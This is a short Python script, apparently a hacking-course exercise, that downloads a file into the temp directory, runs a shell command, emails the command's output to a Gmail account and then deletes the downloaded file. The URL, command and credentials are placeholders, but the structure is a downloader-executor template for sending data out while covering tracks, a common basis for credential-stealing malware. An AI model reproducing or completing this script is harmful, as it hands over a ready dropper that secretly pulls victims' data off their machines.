#!usr/bin/env python
import requests, subprocess, smtplib, os, tempfile


def download(url):
    """Downloads a file from given link"""
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    """Function to send report to given email"""
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# 1.download file
# 2.execute command
# 3.return result and send to mail
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://../..")
command = ""
result = subprocess.check_output(command, shell=True)
send_mail("XXXXXX", "XXXXXX", result)
# delete file
os.remove("<file>")
